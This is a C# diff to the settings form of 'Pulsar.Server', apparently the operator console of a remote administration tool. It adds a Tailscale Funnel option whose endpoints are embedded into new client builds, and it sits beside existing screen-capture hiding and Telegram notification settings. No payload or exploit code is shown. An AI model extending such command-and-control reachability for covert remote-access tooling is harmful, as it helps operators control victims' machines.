@@ -21,10 +21,13 @@ namespace Pulsar.Server.Forms
     {
         private readonly PulsarServer _listenServer;
         private bool _previousDiscordRPCState; // Track previous state of Discord RPC checkbox
+        private readonly TailscaleFunnelService _tailscaleFunnelService;
 
         public FrmSettings(PulsarServer listenServer)
         {
             this._listenServer = listenServer;
+
+            _tailscaleFunnelService = TailscaleFunnelService.Instance;
 
             InitializeComponent();
 
@@ -32,6 +35,7 @@ namespace Pulsar.Server.Forms
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             ToggleListenerSettings(!listenServer.Listening);
+            _tailscaleFunnelService.FunnelEndpointChanged += OnFunnelEndpointChanged;
         }
 
         private void FrmSettings_Load(object sender, EventArgs e)
@@ -65,6 +69,10 @@ namespace Pulsar.Server.Forms
             chkTelegramNotis.Checked = Settings.TelegramNotifications;
             chkDiscordRPC.Checked = Settings.DiscordRPC; // hidden by design
             _previousDiscordRPCState = chkDiscordRPC.Checked;
+
+            chkUseTailscaleFunnel.Checked = Settings.UseTailscaleFunnel;
+            UpdateFunnelEndpointDisplay();
+            ApplyFunnelMode();
 
             string pulsarPath = Path.Combine(Application.StartupPath, "PulsarStuff");
             string filePath = Path.Combine(pulsarPath, "blocked.json");
@@ -300,10 +308,10 @@ namespace Pulsar.Server.Forms
         private void ToggleListenerSettings(bool enabled)
         {
             btnListen.Text = enabled ? "Start listening" : "Stop listening";
-            ncPort.Enabled = false;
+            ncPort.Enabled = !chkUseTailscaleFunnel.Checked;
             chkIPv6Support.Enabled = enabled;
-            chkUseUpnp.Enabled = enabled;
-            txtMultiPorts.Enabled = enabled;
+            chkUseUpnp.Enabled = enabled && !chkUseTailscaleFunnel.Checked;
+            txtMultiPorts.Enabled = enabled && !chkUseTailscaleFunnel.Checked;
         }
 
         private void TelegramControlHandler(bool enable)
@@ -377,6 +385,88 @@ namespace Pulsar.Server.Forms
         {
             ScreenCaptureHider.ScreenCaptureHider.FormsHiddenFromScreenCapture = chkHideFromScreenCapture.Checked;
             ScreenCaptureHider.ScreenCaptureHider.Refresh();
+        }
+
+        private void OnFunnelEndpointChanged(object sender, TailscaleFunnelInfo info)
+        {
+            if (IsDisposed || Disposing)
+            {
+                return;
+            }
+
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action(() => OnFunnelEndpointChanged(sender, info)));
+                return;
+            }
+
+            UpdateFunnelEndpointDisplay(info);
+        }
+
+        private void UpdateFunnelEndpointDisplay(TailscaleFunnelInfo info = null)
+        {
+            var endpoint = info?.Endpoint;
+            if (string.IsNullOrWhiteSpace(endpoint))
+            {
+                endpoint = Settings.TailscaleFunnelEndpoint;
+            }
+
+            if (string.IsNullOrWhiteSpace(endpoint))
+            {
+                endpoint = "No funnel endpoint detected.";
+            }
+
+            txtFunnelEndpoint.Text = endpoint;
+        }
+
+        private void ApplyFunnelMode()
+        {
+            bool funnelEnabled = chkUseTailscaleFunnel.Checked;
+
+            if (funnelEnabled)
+            {
+                chkUseUpnp.Checked = false;
+            }
+
+            chkUseUpnp.Enabled = btnListen.Text == "Start listening" && !funnelEnabled;
+            txtMultiPorts.Enabled = btnListen.Text == "Start listening" && !funnelEnabled;
+            ncPort.Enabled = !funnelEnabled;
+            btnRefreshFunnel.Enabled = funnelEnabled;
+
+            lblFunnelStatus.Text = funnelEnabled
+                ? "Tailscale funnel endpoints will be embedded into new builds."
+                : "Manual host entries remain active.";
+        }
+
+        private void chkUseTailscaleFunnel_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkUseTailscaleFunnel.Checked)
+            {
+                if (Settings.UseUPnP)
+                {
+                    Settings.UseUPnP = false;
+                }
+                Settings.UseTailscaleFunnel = true;
+                chkUseUpnp.Checked = false;
+                _tailscaleFunnelService.RequestImmediateRefresh();
+            }
+            else
+            {
+                Settings.UseTailscaleFunnel = false;
+            }
+
+            ApplyFunnelMode();
+            UpdateFunnelEndpointDisplay();
+        }
+
+        private void btnRefreshFunnel_Click(object sender, EventArgs e)
+        {
+            _tailscaleFunnelService.RequestImmediateRefresh();
+        }
+
+        private void FrmSettings_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            _tailscaleFunnelService.FunnelEndpointChanged -= OnFunnelEndpointChanged;
         }
     }
 }
